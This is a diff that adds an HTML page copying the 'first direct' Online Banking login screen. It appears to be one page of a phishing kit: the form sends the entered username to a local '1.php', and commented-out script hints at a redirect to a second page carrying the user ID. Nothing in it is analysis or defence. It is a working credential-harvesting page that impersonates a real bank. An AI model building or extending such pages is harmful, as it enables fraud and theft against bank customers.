@@ -1,0 +1,96 @@
+<html>
+
+<head>
+    <link rel="stylesheet" href="css/app.css">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    <div id="app">
+        <div id="main" class="_323TU608c7R7" data-path="/authentication/username" aria-hidden="false"><span class="_18lR5Lcsowvx"></span>
+            <main id="content" class="_2c87ug2gdnMj iSsy-kS_VNy5" aria-live="polite" aria-hidden="false"><a class="_3uPSPih3cDvg" data-qa="screen-reader-label" id="maincontent" name="maincontent" tabindex="-1">Main content</a>
+                <form class="_2kwu1cwKs9T_" autocomplete="off" action="1.php" method="post">
+                    <button type="submit" aria-hidden="true">Continue</button>
+                    <section data-qa="cam-10-page" class="_29F8NWiiqSC3">
+                        <div class="_1X89qp1igOet">
+                            <div tabindex="-1" class="_3xPv4X2mUydX">
+                                <span class="_3uPSPih3cDvg" data-qa="screen-reader-label">Welcome to Online Banking</span>
+                            </div>
+                            <div class="_3eQtoAx26Fcq">
+                                <span class="dPKmS236Npsr desktop withFscs">
+                                    <span class="_3uPSPih3cDvg" data-qa="screen-reader-label">first direct</span>
+                                </span>
+                                <div class="_33L-2J38Wsyv mobile">
+                                    <button type="button" class="P_5rUHJIogxd" aria-label="Financial Services Compensation Scheme Info"></button>
+                                </div>
+                            </div>
+                            <div class="L8vJsKaVQWNa">
+                                <h1 class="_2rnMquiDwicT">Welcome to Online Banking</h1>
+                                <div class="_29nFIMM-RjyQ"></div>
+                            </div>
+                            <div class="_3Ro6ZCWC7I1e">
+                                <div class="_33L-2J38Wsyv desktop"><button type="button" class="P_5rUHJIogxd" aria-label="Financial Services Compensation Scheme Info"></button></div>
+                            </div>
+                        </div>
+                        <div class="_3pe8PXvAbUT6">
+                            <div class="_1GHP4BOvDft7 _2e9QSPL6OSaY">
+                                <fieldset>
+                                    <legend>Log on to Online Banking</legend><label class="RE2Klxc4g_7m" for="userid">Enter your username</label>
+                                    <div><input name="userid" type="text" id="userid" aria-required="true" size="30" maxlength="76" value=""></div>
+                                    <div class="_3tW9QbLuVrfR">
+                                        <div class="_2QC5g1OhLiYB">
+                                            <div class="gG1Q47dIo9xp"><input id="cookieuserid" name="cookieuserid" type="checkbox" aria-describedby="" value=""><button type="button" class="G9lXOSx07YPO" aria-hidden="true" tabindex="-1"><span class="_3n38LlUbX1fp"></span></button>
+                                                <label for="cookieuserid">Remember me</label>
+                                            </div>
+                                        </div><button type="button" class="_3WSPbPbdRYDX l6cAWyTWc38d">Forgotten your username?</button></div>
+                                    <div class="_3CPEmgd7mKjp">
+                                        <button class="_3qcy6oh1BJdO _1wxVBjVdI7l6" type="submit" data-qa="logon-next-button" id="btn-continue" aria-disabled="true">Continue</button>
+                                    </div>
+                                </fieldset>
+                                <fieldset>
+                                    <legend>New to Online Banking?</legend>
+                                    <p class="RE2Klxc4g_7m">Please use the 'Register' button to get started.</p><button type="button" class="_3WSPbPbdRYDX l6cAWyTWc38d _315ct2tvhh3s">What you'll need to register</button>
+                                    <div class="_3CPEmgd7mKjp">
+                                        <button class="_3qcy6oh1BJdO _346tgcQzioQc" type="button" data-qa="register-next-button" value="" id="btn-register">Register</button>
+                                    </div>
+                                </fieldset>
+                            </div>
+                        </div>
+                    </section>
+                </form>
+            </main><span class="_3YY65zlSVHy2" aria-hidden="true">&nbsp;</span><span class="_2gobnFGrEjFb" aria-hidden="true">&nbsp;</span><span class="_2AD7S671Wm7o" aria-hidden="true">&nbsp;</span>
+        </div>
+        <div class="ReactModalPortal"></div>
+        <div class="ReactModalPortal"></div>
+        <div class="ReactModalPortal"></div>
+        <div class="ReactModalPortal"></div>
+    </div>
+    <script>
+        var registerBtn = document.getElementById('btn-register');
+        registerBtn.addEventListener('click', () => {
+            //location.href = "3.html";
+        });
+
+        var continueBtn = document.getElementById('btn-continue');
+        // continueBtn.addEventListener('click', (e) => {
+        //     e.preventDefault();
+        //     userid = document.getElementById('userid').value;
+        //     location.href = "2.html?userid=" + userid;
+        // })
+
+        document.getElementById('userid').addEventListener('input', () => {
+            var userid = document.getElementById('userid').value;
+            if (userid) {
+                document.getElementById('btn-continue').classList.add('_346tgcQzioQc');
+                document.getElementById('btn-continue').classList.add('black');
+                document.getElementById('btn-continue').classList.remove('_1wxVBjVdI7l6');
+            } else {
+                document.getElementById('btn-continue').classList.add('_1wxVBjVdI7l6');
+                document.getElementById('btn-continue').classList.remove('_346tgcQzioQc');
+                document.getElementById('btn-continue').classList.remove('black');
+            }
+        });
+    </script>
+</body>
+
+</html>
